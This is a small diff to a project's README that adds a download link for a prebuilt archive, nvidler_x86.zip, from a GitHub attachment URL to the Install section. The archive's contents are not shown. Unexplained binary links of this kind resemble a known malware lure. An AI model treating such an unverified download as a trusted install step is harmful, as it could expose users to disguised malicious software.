@@ -24,6 +24,8 @@ Probably lots, YMMV etc...
 
 ## Install
 
+[nvidler_x86.zip](https://github.com/sammcj/nvidler/files/12694118/nvidler_x86.zip)
+
 For Fedora and most common distributions, you can use the install script:
 
 ```bash
